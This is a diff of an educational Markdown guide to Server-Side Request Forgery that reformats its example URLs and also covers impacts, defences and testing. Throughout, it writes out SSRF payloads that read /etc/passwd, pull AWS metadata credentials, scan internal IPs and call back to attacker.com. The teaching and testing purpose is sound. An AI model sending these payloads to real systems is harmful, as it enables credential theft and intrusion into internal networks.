@@ -21,25 +21,29 @@ An attacker can modify the url parameter to target internal systems:
 1. Basic SSRF
     - Description: The attacker controls the target ```URL```, allowing them to interact with internal services or retrieve sensitive data.
     - Example:
-        - ```http://example.com/fetch?url=http://127.0.0.1/admin```
+        
+            http://example.com/fetch?url=http://127.0.0.1/admin
         - This could expose sensitive admin interfaces or internal services.
     - Impact: Accessing internal endpoints, services, or sensitive files, which are usually not exposed to the public internet.
 2. Blind SSRF
     - Description: The attacker cannot see the server's response, but can still control the target and infer actions based on server behavior (e.g., timing or error messages).
     - Example:
-        - ```http://example.com/fetch?url=http://internal-service/api/delete```
+            
+            http://example.com/fetch?url=http://internal-service/api/delete
         - The attacker triggers actions on internal services without seeing the response.
     - Impact: Even without seeing the response, attackers can perform malicious actions like triggering internal services or performing denial of service attacks.
 3. SSRF to Internal Networks
     - Description: Attackers use SSRF to access and explore internal networks by targeting internal IP addresses or hostnames.
     - Example:
         - Target internal services using private IP ranges:
-        - ```http://example.com/fetch?url=http://192.168.1.1```
+        
+                http://example.com/fetch?url=http://192.168.1.1
     - Impact: Exposes internal network details, potentially allowing further network exploration, internal service access, or lateral movement.
 4. SSRF via Cloud Metadata Services
     - Description: Many cloud services provide a metadata API (e.g., AWS, Google Cloud) that can be accessed from within the infrastructure. Attackers can exploit SSRF to retrieve sensitive information, like credentials.
     - Example (AWS):
-        - ```http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/```
+            
+            http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
         - This URL accesses the metadata service, potentially exposing AWS access keys.
     - Impact: Exposing cloud instance metadata, which can reveal sensitive information like instance details or cloud service credentials.
 
@@ -48,22 +52,26 @@ An attacker can modify the url parameter to target internal systems:
     - Description: SSRF can allow attackers to access internal resources that are not meant to be exposed to the public, such as administrative interfaces, databases, or internal APIs.
     - Example:
         - An attacker can access an internal management portal:
-        - ```http://example.com/fetch?url=http://localhost/admin```
+        
+                http://example.com/fetch?url=http://localhost/admin
 2. Exfiltrating Sensitive Data
     - Description: Attackers can use SSRF to request sensitive internal files or data, such as system credentials, logs, or configuration files.
     - Example:
         - Access internal sensitive files like:
-        - ```http://example.com/fetch?url=file:///etc/passwd```
+        
+                http://example.com/fetch?url=file:///etc/passwd
 3. Exploiting Cloud Metadata Services
     - Description: Attackers can use SSRF to retrieve cloud provider metadata, such as credentials or instance information.
     - Example:
         - Access AWS credentials through the metadata API:
-        - ```http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/```
+        
+                http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 4. Pivoting to Internal Services
     - Description: Once an attacker has access to an internal service via SSRF, they can use it to pivot and explore further into the internal network.
     - Example:
         - An attacker can discover internal services running on private IPs:
-        - ```http://example.com/fetch?url=http://192.168.1.10:8080```
+        
+                http://example.com/fetch?url=http://192.168.1.10:8080
 5. Performing Denial of Service (DoS)
     - Description: SSRF can be exploited to target internal or external services with a flood of requests, causing performance degradation or service interruption.
     - Example:
@@ -73,21 +81,25 @@ An attacker can modify the url parameter to target internal systems:
 1. Basic SSRF Exploitation
     - Technique: Modify user-controllable input (e.g., a URL parameter) to point to sensitive internal services or files.
     - Example:
-        - ```http://example.com/fetch?url=http://127.0.0.1/admin```
+        
+            http://example.com/fetch?url=http://127.0.0.1/admin
 2. Exploiting Cloud Metadata Services
     - Technique: Use SSRF to request cloud instance metadata endpoints that can expose sensitive information, such as access credentials or configuration details.
     - Example (AWS):
-        - http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+        
+            http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 3. Port Scanning Internal Networks
     - Technique: Use SSRF to perform port scans of internal networks by testing various IP addresses and ports to identify services running on them.
     - Example:
         - Scanning an internal service:
-        - ```http://example.com/fetch?url=http://192.168.1.10:8080```
+        
+                http://example.com/fetch?url=http://192.168.1.10:8080
 4. Blind SSRF
     - Technique: Even without seeing the server’s response, attackers can perform actions by observing side effects, such as error messages or response time.
     - Example:
         - Triggering a request that leads to an external service to check for network activity or changes:
-        - ```http://example.com/fetch?url=http://attacker.com```
+        
+                http://example.com/fetch?url=http://attacker.com
 
 ## Defense Mechanisms Against SSRF
 1. Whitelist External Resources
@@ -127,9 +139,10 @@ An attacker can modify the url parameter to target internal systems:
     - Inject Internal and External URLs:
         - Test with URLs pointing to internal services, local files, or cloud metadata endpoints.
         - Examples:
-            - ```http://example.com/fetch?url=http://127.0.0.1/admin```
-            - ```http://example.com/fetch?url=file:///etc/passwd```
-            - ```http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/```
+                
+                http://example.com/fetch?url=http://127.0.0.1/admin
+                http://example.com/fetch?url=file:///etc/passwd
+                http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
 2. Automated Testing Tools
     - Burp Suite:
         - Use Burp Suite Intruder to test SSRF by sending multiple requests to internal/external IPs and URLs.
@@ -140,7 +153,8 @@ An attacker can modify the url parameter to target internal systems:
     - Cloud-Specific SSRF:
         - Target cloud metadata services like AWS or Google Cloud to retrieve sensitive information.
         - Example (AWS):
-            - ```http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/```
+            
+                http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 4. Monitor Server Responses and Logs
     - Look for Indicators of SSRF:
         - Check server responses for internal IP addresses or unexpected external responses.
